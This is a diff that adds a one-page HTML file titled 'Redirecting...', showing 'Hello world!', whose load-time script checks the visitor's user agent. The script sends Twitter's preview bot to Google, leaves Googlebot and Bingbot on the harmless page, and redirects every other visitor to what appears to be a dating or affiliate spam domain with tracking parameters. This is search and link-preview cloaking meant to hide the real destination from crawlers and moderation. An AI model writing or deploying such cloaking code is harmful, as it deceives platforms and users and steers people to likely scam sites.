@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirecting...</title>
+    <script type="text/javascript">
+        function redirectUser() {
+            var userAgent = navigator.userAgent.toLowerCase();
+            var isTwitterBot = userAgent.indexOf("twitterbot") !== -1;
+            var isGoogleBot = userAgent.indexOf("googlebot") !== -1;
+            var isBingBot = userAgent.indexOf("bingbot") !== -1;
+
+            // Add other bots as needed
+            // var isAnotherBot = userAgent.indexOf("anotherbot") !== -1;
+
+            if (isTwitterBot) {
+                // Redirect Twitter bots to Google
+                window.location.href = "https://www.google.com";
+            } else if (!isGoogleBot && !isBingBot /* && !isAnotherBot */) {
+                // Redirect all other users (excluding certain bots) to a different site
+                window.location.href = "https://girlsglowdate.life/?u=xy5pteb&o=bp1kwz4&t=x&cid=look";
+            }
+            // If it's Googlebot, Bingbot, or another excluded bot, do nothing (no redirection)
+        }
+    </script>
+</head>
+<body onload="redirectUser()">
+    <p>Hello world!</p>
+</body>
+</html>
